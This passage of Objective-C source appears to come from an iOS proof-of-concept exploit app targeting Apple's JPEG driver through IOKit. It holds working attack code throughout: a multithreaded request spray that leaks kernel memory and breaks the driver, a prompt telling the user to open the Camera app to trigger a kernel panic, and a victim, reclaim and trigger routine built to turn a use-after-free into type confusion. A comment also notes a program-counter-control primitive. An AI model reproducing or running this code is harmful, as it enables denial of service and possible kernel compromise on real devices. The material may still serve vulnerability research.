            // Release OOL spray (frees all queued kalloc(0x440) allocations)
            mach_port_destroy(mach_task_self(), sprayPort);

            [self log:@"Phase 2 done: victim=%d reclaim=%d",
                (int)raceV, (int)raceR];
        }

        // ---------------------------------------------------------------
        // Results
        // ---------------------------------------------------------------
        usleep(500000);
        int64_t wiredAfter = [self wiredMemoryPages];
        int64_t delta = wiredAfter - wiredBefore;
        healthy = [self checkDriverHealth:svc];

        IOObjectRelease(svc);
        CFRelease(srcSurf);
        CFRelease(dstSurf);

        [self log:@"--- Results ---"];
        [self log:@"Phase 1: %d victim / %d reclaim | health %d/%d",
            victimTotal, reclaimTotal, healthOK, healthTotal];
        [self log:@"Wired delta: %+lld pg (%+lld KB / %+lld MB)",
            delta, delta * (int64_t)pageSize / 1024,
            delta * (int64_t)pageSize / (1024*1024)];
        [self log:@"Driver: %@", healthy ? @"OK" : @"BROKEN (DoS)"];
        [self log:@"---"];
        [self log:@"If no panic → reclaim succeeded (controlled UAF)"];
        [self log:@"If panic → FEEDFACE in freed slot (uncontrolled UAF)"];
        [self log:@"PC control: *(*(req+0)+40)() in finish_io_gated"];

        self.running = NO;
    });
}

#pragma mark - Spray

- (void)sprayLeak:(int)count {
    if (self.running) {
        [self log:@"Already running - press Stop first"];
        return;
    }
    self.running = YES;

    // Concurrent spray: multiple threads hammering the driver simultaneously.
    // This replicates the "smashed button" effect that triggers massive leaks
    // by creating contention on the driver's command gate and codec pool.
    const int THREADS = 8;
    const int REQS = 10; // async requests per connection
    const int PER_THREAD = count / THREADS;

    [self log:@"--- Concurrent Spray: %d threads x %d iters x %d reqs ---",
        THREADS, PER_THREAD, REQS];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        io_service_t svc = [self findJPEGService];
        if (!svc) {
            [self log:@"Service not found"];
            self.running = NO;
            return;
        }

        BOOL healthy = [self checkDriverHealth:svc];
        [self log:@"Driver health: %@", healthy ? @"OK" : @"BROKEN"];
        if (!healthy) {
            [self log:@"Driver broken - reboot first"];
            IOObjectRelease(svc);
            self.running = NO;
            return;
        }

        const uint32_t W = 2048, H = 2048;
        NSData *jpegData = [self createTestJPEG:W height:H];
        IOSurfaceRef srcSurf = [self createSourceSurface:jpegData];
        IOSurfaceRef dstSurf = [self createDestSurface:W height:H];
        if (!srcSurf || !dstSurf) {
            [self log:@"Surface creation failed"];
            IOObjectRelease(svc);
            if (srcSurf) CFRelease(srcSurf);
            if (dstSurf) CFRelease(dstSurf);
            self.running = NO;
            return;
        }
        uint32_t srcID = IOSurfaceGetID(srcSurf);
        uint32_t dstID = IOSurfaceGetID(dstSurf);
        [self log:@"src=%u dst=%u | %dx%d", srcID, dstID, W, H];

        vm_size_t pageSize = 0;
        host_page_size(mach_host_self(), &pageSize);
        int64_t wiredBefore = [self wiredMemoryPages];
        [self log:@"Wired before: %lld pages (%lld MB)",
            wiredBefore, wiredBefore * (int64_t)pageSize / (1024*1024)];

        __block int32_t totalSubmitted = 0;
        __block int32_t totalConn = 0;

        dispatch_group_t group = dispatch_group_create();

        // Launch THREADS concurrent workers
        for (int t = 0; t < THREADS; t++) {
            dispatch_group_async(group,
                dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
                for (int i = 0; i < PER_THREAD && self.running; i++) {
                    io_connect_t conn = [self openUC:svc];
                    if (!conn) continue;

                    // No notification port (SIGKILL on some devices)
                    int submitted = 0;
                    for (int j = 0; j < REQS; j++) {
                        AppleJPEGDriverIOStruct input = {0};
                        AppleJPEGDriverIOStruct output = {0};
                        input.sourceID    = srcID;
                        input.field_04    = W * H;
                        input.destID      = dstID;
                        input.field_0C    = W * H * 4;
                        input.width       = W;
                        input.height      = H;
                        input.outWidth    = W;
                        input.outHeight   = H;
                        input.subsampling = 3;
                        input.asyncToken  = 0x4141 + j;

                        size_t outSize = sizeof(output);
                        kern_return_t kr = IOConnectCallStructMethod(conn, 1,
                            &input, sizeof(input), &output, &outSize);
                        if (kr != KERN_SUCCESS) break;
                        submitted++;
                    }

                    IOServiceClose(conn);

                    __sync_fetch_and_add(&totalSubmitted, submitted);
                    __sync_fetch_and_add(&totalConn, 1);
                }
            });
        }

        // Progress: poll every 2s while workers are active
        while (dispatch_group_wait(group,
            dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC)) != 0)
        {
            if (!self.running) break;
            int64_t wiredNow = [self wiredMemoryPages];
            int64_t delta = wiredNow - wiredBefore;
            [self log:@"[conn=%d req=%d] wired: %+lld pg (%+lld KB)",
                totalConn, totalSubmitted,
                delta, delta * (int64_t)pageSize / 1024];
        }

        usleep(500000); // final drain

        int64_t wiredAfter = [self wiredMemoryPages];
        int64_t delta = wiredAfter - wiredBefore;
        healthy = [self checkDriverHealth:svc];

        IOObjectRelease(svc);
        CFRelease(srcSurf);
        CFRelease(dstSurf);

        [self log:@"--- Results ---"];
        [self log:@"Threads: %d | Conn: %d | Requests: %d",
            THREADS, (int)totalConn, (int)totalSubmitted];
        [self log:@"Wired delta: %+lld pages (%+lld KB / %+lld MB)",
            delta,
            delta * (int64_t)pageSize / 1024,
            delta * (int64_t)pageSize / (1024*1024)];
        [self log:@"Wired after: %lld pages (%lld MB)",
            wiredAfter, wiredAfter * (int64_t)pageSize / (1024*1024)];
        [self log:@"Driver: %@",
            healthy ? @"OK" : @"BROKEN (DoS confirmed)"];
        self.running = NO;
        dispatch_async(dispatch_get_main_queue(), ^{
            self.statusLabel.text = @"OPEN CAMERA NOW";
            self.statusLabel.font = [UIFont systemFontOfSize:28 weight:UIFontWeightBlack];
            self.statusLabel.textColor = [UIColor redColor];

            // Pulse animation
            [UIView animateWithDuration:0.5 delay:0
                options:UIViewAnimationOptionRepeat | UIViewAnimationOptionAutoreverse
                animations:^{ self.statusLabel.alpha = 0.2; }
                completion:nil];

            UIAlertController *alert = [UIAlertController
                alertControllerWithTitle:@"Open Camera"
                message:@"Spray complete. Open the Camera app now to trigger the panic."
                preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"OK"
                style:UIAlertActionStyleDefault handler:nil]];
            [self presentViewController:alert animated:YES completion:nil];
        });
    });
}

#pragma mark - Path 3B: same-type reclaim with surface ID mismatch

// Path 3B PoC: structured victim→reclaim→trigger→observe cycle.
//
// Strategy: Both victim and reclaim use 2048x2048 (needed for race window:
// submit < close proves HW still processing at close time). The mismatch
// is in SURFACE IDs and request TYPE, not dimensions:
//   - Victim: decode (sel 1), surfaces A → freed by IOServiceClose
//   - Reclaim: decode/encode (sel 1/3), surfaces B → fills freed JpegRequest slots
//   - Stale queue entries now contain reclaim data (surfaces B, possibly encode type)
//   - begin_io_gated dequeues stale → double-processes reclaim request OR
//     processes encode-type data as decode → type confusion
//
// Phase A: Submit victim decode requests (2048x2048, surfaces A) → close
// Phase B: Reclaim freed slots (2048x2048, surfaces B, decode or encode)
// Phase C: Trigger dequeue (new connection activates begin_io_gated)
// Phase D: Observe (health check, wired delta, error codes)

// Submit N async encode requests (selector 3) on a connection.
// Encode sets different fields in JpegRequest than decode:
//   - req+464 (encode flag) ≠ 0 → startEncoderGated path
//   - Surface semantics reversed: src=BGRA pixels, dst=JPEG output
- (int)submitEncodeRequests:(io_connect_t)conn
                      srcID:(uint32_t)srcID dstID:(uint32_t)dstID
                      width:(uint32_t)W height:(uint32_t)H
                      count:(int)N tokenBase:(uint64_t)tokenBase
{
    int submitted = 0;
    for (int j = 0; j < N; j++) {
        AppleJPEGDriverIOStruct input = {0};
        AppleJPEGDriverIOStruct output = {0};
        input.sourceID    = srcID;     // BGRA pixel surface
        input.field_04    = W * H * 4; // input size = pixel buffer
        input.destID      = dstID;     // JPEG output buffer
        input.field_0C    = W * H;     // output buffer size estimate
        input.width       = W;
        input.height      = H;
        input.outWidth    = W;
        input.outHeight   = H;
        input.subsampling = 3;         // YUV420
        input.asyncToken  = tokenBase + j;
        size_t outSize = sizeof(output);
        kern_return_t kr = IOConnectCallStructMethod(conn, 3,
            &input, sizeof(input), &output, &outSize);
        if (kr != KERN_SUCCESS) break;
        submitted++;
    }
    return submitted;
}

- (void)triggerPath3B {
    if (self.running) {
        [self log:@"Already running"];
        return;
    }
    self.running = YES;

    [self log:@"=== Path 3B: Reclaim vs No-Reclaim Stale Processing ==="];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        io_service_t svc = [self findJPEGService];
        if (!svc) {
            [self log:@"Service not found"];
            self.running = NO;
            return;
        }

        BOOL healthy = [self checkDriverHealth:svc];
        [self log:@"Driver: %@", healthy ? @"OK" : @"BROKEN"];
        if (!healthy) {
            IOObjectRelease(svc);
            self.running = NO;
            return;
        }

        const uint32_t W = 2048, H = 2048;
        NSData *jpegData = [self createTestJPEG:W height:H];

        // Victim surfaces
        IOSurfaceRef vSrcSurf = [self createSourceSurface:jpegData];
        IOSurfaceRef vDstSurf = [self createDestSurface:W height:H];

        // Reclaim + trigger surfaces (different set)
        IOSurfaceRef rSrcSurf = [self createSourceSurface:jpegData];
        IOSurfaceRef rDstSurf = [self createDestSurface:W height:H];

        if (!vSrcSurf || !vDstSurf || !rSrcSurf || !rDstSurf) {
            [self log:@"Surface creation failed"];
            IOObjectRelease(svc);
            if (vSrcSurf) CFRelease(vSrcSurf);
            if (vDstSurf) CFRelease(vDstSurf);
            if (rSrcSurf) CFRelease(rSrcSurf);
            if (rDstSurf) CFRelease(rDstSurf);
            self.running = NO;
            return;
        }

        uint32_t vSrcID = IOSurfaceGetID(vSrcSurf);
        uint32_t vDstID = IOSurfaceGetID(vDstSurf);
        uint32_t rSrcID = IOSurfaceGetID(rSrcSurf);
        uint32_t rDstID = IOSurfaceGetID(rDstSurf);

        [self log:@"Victim:  src=%u dst=%u", vSrcID, vDstID];
        [self log:@"Reclaim: src=%u dst=%u", rSrcID, rDstID];

        mach_timebase_info_data_t tbi;
        mach_timebase_info(&tbi);

        // ---------------------------------------------------------------
        // THREE-CONDITION TEST
        //
        // Key question: does same-type reclaim change how stale entries
        // are processed by finish_io_gated?
        //
        // Without reclaim: stale entry has ORIGINAL data →
        //   request[0] = victim's UC (isInactive=TRUE) → LEAK (no free)
        //
        // With reclaim: stale entry has RECLAIMED data →
        //   request[0] = reclaim's UC (isInactive=FALSE) → FREE
        //   This frees memory the reclaim connection is using → UAF
        //
        // If reclaim changes behavior: timing overhead per stale entry
        // will differ between conditions A and B.
        //
        // Also: if entries are leaked (A) vs freed (B), task footprint
        // should diverge over many cycles.
        // ---------------------------------------------------------------
        const int DOSE     = 5;
        const int CYCLES   = 40;
        const int R_CONNS  = 3;
        const int R_REQS   = 5;

        uint64_t timA[40], timB[40], timC[40];
        int nA = 0, nB = 0, nC = 0;
        int errA = 0, errB = 0, errC = 0;

        // Helper block for sync trigger measurement
        uint64_t (^syncTrigger)(void) = ^uint64_t{
            io_connect_t t = [self openUC:svc];
            if (!t) return 0;
            AppleJPEGDriverIOStruct in = {0}, out = {0};
            in.sourceID    = rSrcID;
            in.field_04    = W * H;
            in.destID      = rDstID;
            in.field_0C    = W * H * 4;
            in.width       = W;
            in.height      = H;
            in.outWidth    = W;
            in.outHeight   = H;
            in.subsampling = 3;
            in.asyncToken  = 0;
            size_t os = sizeof(out);
            uint64_t t0 = mach_absolute_time();
            IOConnectCallStructMethod(t, 1, &in, sizeof(in), &out, &os);
            uint64_t t1 = mach_absolute_time();
            IOServiceClose(t);
            return (t1 - t0) * tbi.numer / tbi.denom / 1000;
        };

        int64_t fpStart = [self taskPhysFootprint];

        // --- Condition A: victim → NO reclaim → sync trigger ---
        [self log:@"A: victim(dose=%d) + NO reclaim + sync trigger...", DOSE];
        int64_t fpA0 = [self taskPhysFootprint];

        for (int c = 0; c < CYCLES && self.running; c++) {
            io_connect_t victim = [self openUC:svc];
            if (!victim) continue;
            [self submitAsyncRequests:victim srcID:vSrcID dstID:vDstID
                width:W height:H count:DOSE tokenBase:0xA000 + c];
            IOServiceClose(victim);
            usleep(2000);

            // NO reclaim — just trigger directly
            uint64_t us = syncTrigger();
            if (us) timA[nA++] = us;
        }

        int64_t fpA1 = [self taskPhysFootprint];
        healthy = [self checkDriverHealth:svc];
        [self log:@"  Health: %@", healthy ? @"OK" : @"BROKEN"];
        usleep(500000); // let HW settle

        // --- Condition B: victim → RECLAIM → sync trigger ---
        [self log:@"B: victim(dose=%d) + reclaim + sync trigger...", DOSE];
        int64_t fpB0 = [self taskPhysFootprint];

        for (int c = 0; c < CYCLES && self.running; c++) {
            io_connect_t victim = [self openUC:svc];
            if (!victim) continue;
            [self submitAsyncRequests:victim srcID:vSrcID dstID:vDstID
                width:W height:H count:DOSE tokenBase:0xC000 + c];
            IOServiceClose(victim);
            usleep(2000);

            // Reclaim: fill freed slots with new requests
            io_connect_t rConns[3];
            int rCount = 0;
            memset(rConns, 0, sizeof(rConns));
            for (int r = 0; r < R_CONNS; r++) {
                io_connect_t rc = [self openUC:svc];
                if (!rc) continue;
                [self submitAsyncRequests:rc srcID:rSrcID dstID:rDstID
                    width:W height:H count:R_REQS
                    tokenBase:0xD000 + c * 0x10 + r];
                rConns[rCount++] = rc;
            }

            uint64_t us = syncTrigger();
            if (us) timB[nB++] = us;

            for (int r = 0; r < rCount; r++)
                if (rConns[r]) IOServiceClose(rConns[r]);
        }

        int64_t fpB1 = [self taskPhysFootprint];
        healthy = [self checkDriverHealth:svc];
        [self log:@"  Health: %@", healthy ? @"OK" : @"BROKEN"];
        usleep(500000);

        // --- Condition C: NO victim → reclaim → sync trigger (baseline) ---
        [self log:@"C: NO victim + reclaim + sync trigger (baseline)..."];
        int64_t fpC0 = [self taskPhysFootprint];

        for (int c = 0; c < CYCLES && self.running; c++) {
            io_connect_t rConns[3];
            int rCount = 0;
            memset(rConns, 0, sizeof(rConns));
            for (int r = 0; r < R_CONNS; r++) {
                io_connect_t rc = [self openUC:svc];
                if (!rc) continue;
                [self submitAsyncRequests:rc srcID:rSrcID dstID:rDstID
                    width:W height:H count:R_REQS
                    tokenBase:0xE000 + c * 0x10 + r];
                rConns[rCount++] = rc;
            }

            uint64_t us = syncTrigger();
            if (us) timC[nC++] = us;

            for (int r = 0; r < rCount; r++)
                if (rConns[r]) IOServiceClose(rConns[r]);
        }

        int64_t fpC1 = [self taskPhysFootprint];

        // ---------------------------------------------------------------
        // Sort + stats
        // ---------------------------------------------------------------
        for (int i = 0; i < nA-1; i++)
            for (int j = i+1; j < nA; j++)
                if (timA[i] > timA[j]) { uint64_t t=timA[i]; timA[i]=timA[j]; timA[j]=t; }
        for (int i = 0; i < nB-1; i++)
            for (int j = i+1; j < nB; j++)
                if (timB[i] > timB[j]) { uint64_t t=timB[i]; timB[i]=timB[j]; timB[j]=t; }
        for (int i = 0; i < nC-1; i++)
            for (int j = i+1; j < nC; j++)
                if (timC[i] > timC[j]) { uint64_t t=timC[i]; timC[i]=timC[j]; timC[j]=t; }

        uint64_t medA = nA ? timA[nA/2] : 0;
        uint64_t medB = nB ? timB[nB/2] : 0;
        uint64_t medC = nC ? timC[nC/2] : 0;
        uint64_t minA = nA ? timA[0] : 0, maxA = nA ? timA[nA-1] : 0;
        uint64_t minB = nB ? timB[0] : 0, maxB = nB ? timB[nB-1] : 0;
        uint64_t minC = nC ? timC[0] : 0, maxC = nC ? timC[nC-1] : 0;

        int64_t fpDeltaA = fpA1 - fpA0;
        int64_t fpDeltaB = fpB1 - fpB0;
        int64_t fpDeltaC = fpC1 - fpC0;

        healthy = [self checkDriverHealth:svc];

        // ---------------------------------------------------------------
        // Results
        // ---------------------------------------------------------------
        [self log:@""];
        [self log:@"=== Results (dose=%d, %d cycles) ===", DOSE, CYCLES];
        [self log:@"A (victim, NO reclaim):  med=%llu min=%llu max=%llu (n=%d)",
            medA, minA, maxA, nA];
        [self log:@"B (victim, reclaim):     med=%llu min=%llu max=%llu (n=%d)",
            medB, minB, maxB, nB];
        [self log:@"C (baseline, no victim): med=%llu min=%llu max=%llu (n=%d)",
            medC, minC, maxC, nC];

        [self log:@""];
        [self log:@"Overhead vs baseline (C):"];
        if (medA > medC)
            [self log:@"  A: +%llu us (%.1f%%, per-entry: %llu us)",
                medA - medC, 100.0*(medA-medC)/medC, (medA-medC)/DOSE];
        else
            [self log:@"  A: -%llu us (no overhead)", medC - medA];
        if (medB > medC)
            [self log:@"  B: +%llu us (%.1f%%, per-entry: %llu us)",
                medB - medC, 100.0*(medB-medC)/medC, (medB-medC)/DOSE];
        else
            [self log:@"  B: -%llu us (no overhead)", medC - medB];

        if (medA != medB) {
            [self log:@""];
            if (medA > medB)
                [self log:@"  A > B by %llu us → NO reclaim path SLOWER (stale processed differently)",
                    medA - medB];
            else
                [self log:@"  B > A by %llu us → reclaim path SLOWER (early-free overhead?)",
                    medB - medA];
            [self log:@"  Per-entry diff: %lld us",
                (int64_t)(medA - medB) / DOSE];
        }

        [self log:@""];
        [self log:@"Task footprint delta (%d cycles):"];
        [self log:@"  A (no reclaim): %+lld KB", fpDeltaA / 1024];
        [self log:@"  B (reclaim):    %+lld KB", fpDeltaB / 1024];
        [self log:@"  C (baseline):   %+lld KB", fpDeltaC / 1024];
        if (fpDeltaA > fpDeltaB + 100*1024)
            [self log:@"  A leaked MORE than B → stale entries LEAKED (not freed) without reclaim"];
        if (fpDeltaB < fpDeltaA - 100*1024)
            [self log:@"  B leaked LESS → reclaim may cause early-free (IOFreeTypeImpl)"];

        [self log:@""];
        [self log:@"Driver final: %@", healthy ? @"OK" : @"BROKEN"];
        [self log:@"Total footprint: %+lld KB", ([self taskPhysFootprint] - fpStart) / 1024];

        CFRelease(vSrcSurf);
        CFRelease(vDstSurf);
        CFRelease(rSrcSurf);
        CFRelease(rDstSurf);
        IOObjectRelease(svc);

        self.running = NO;
    });
}

@end
